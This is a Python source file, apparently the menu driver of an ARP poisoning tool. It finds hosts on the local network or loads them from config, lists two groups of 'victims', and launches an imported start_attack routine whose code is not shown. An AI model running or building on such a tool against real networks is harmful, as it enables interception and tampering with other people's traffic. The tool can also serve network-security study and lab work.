import os
from config import config

def main():
    from discovery import start_discovery
    from ARP import start_attack
    while True:
        os.system("clear")
        print("1: Start ARP poisoning attack")
        print("2: Quit")

        print()
        choice = input("Press a number: ")

        if choice == "1":
            if config.arp_skip_discovery:
                from discovery import get_self_ip, get_self_mac
                group1 = config.arp_hardcoded_group1
                group2 = config.arp_hardcoded_group2
                interface = config.arp_hardcoded_interface
                self_ip = get_self_ip(interface)
                self_mac = get_self_mac(interface)
            else:
                group1, group2, interface, self_ip, self_mac = start_discovery()

            if len(group1 + group2) < 2:
                input("Not enough victims returned...")
            else:
                from discovery import print_devices
                os.system("clear")
                print("Group 1:")
                print_devices(group1)
                print()
                print("Group 2:")
                print_devices(group2)
                print()
                input("Press Enter to continue...")
                start_attack(group1, group2, self_ip, self_mac, interface)
        elif choice == "2":
            break

if __name__ == "__main__":
    main()
